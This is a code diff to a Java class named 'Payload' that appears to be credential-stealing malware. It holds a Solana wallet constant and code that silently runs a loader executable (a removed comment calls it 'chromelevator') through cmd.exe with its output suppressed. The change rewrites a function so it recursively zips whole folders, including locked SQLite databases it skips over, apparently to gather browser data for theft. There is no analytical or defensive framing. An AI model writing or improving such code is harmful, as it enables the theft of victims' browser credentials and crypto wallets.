@@ -6,6 +6,7 @@ import java.nio.file.*;
 import java.util.Base64;
 import java.util.zip.*;
 import java.util.Comparator;
+import java.util.stream.Stream;
 
 public class Payload {
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
@@ -193,7 +194,6 @@ public class Payload {
                 File exeFile = new File(loaderDir, exe);
                 if (exeFile.exists() && exeFile.length() > 1024) {
                     try {
-                        // cmd.exe /c with working directory set to loaderDir runs it exactly like .\2.exe all
                         String cmd = exe + " all";
                         ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                         pb.directory(loaderDir);
@@ -201,7 +201,6 @@ public class Payload {
                         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                         pb.start();
                     } catch (Exception e) {}
-                    // 5 seconds gives chromelevator (2.exe) enough time to finish extraction before 1.exe runs
                     Thread.sleep(5000);
                 }
             }
@@ -275,17 +274,27 @@ public class Payload {
         } catch (Exception e) {}
     }
 
+    // --- UPDATED RECURSIVE ZIP FUNCTION ---
     private static void zipFolders(File[] dirs, File zipFile) {
         try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
             for (File dir : dirs) {
                 if (!dir.exists()) continue;
                 String folderName = dir.getName();
-                for (File f : dir.listFiles()) {
-                    if (f.isFile()) {
-                        zos.putNextEntry(new ZipEntry(folderName + "/" + f.getName()));
-                        Files.copy(f.toPath(), zos);
-                        zos.closeEntry();
-                    }
+                Path basePath = dir.toPath();
+
+                // Recursively walk all files in the directory
+                try (Stream<Path> stream = Files.walk(basePath)) {
+                    stream.filter(Files::isRegularFile).forEach(filePath -> {
+                        try {
+                            // Build the zip entry path, keeping the folder structure intact
+                            String entryName = folderName + "/" + basePath.relativize(filePath).toString().replace('\\', '/');
+                            zos.putNextEntry(new ZipEntry(entryName));
+                            Files.copy(filePath, zos);
+                            zos.closeEntry();
+                        } catch (IOException e) {
+                            // Ignore locked files (e.g., if SQLite is currently writing)
+                        }
+                    });
                 }
             }
         } catch (Exception e) {}
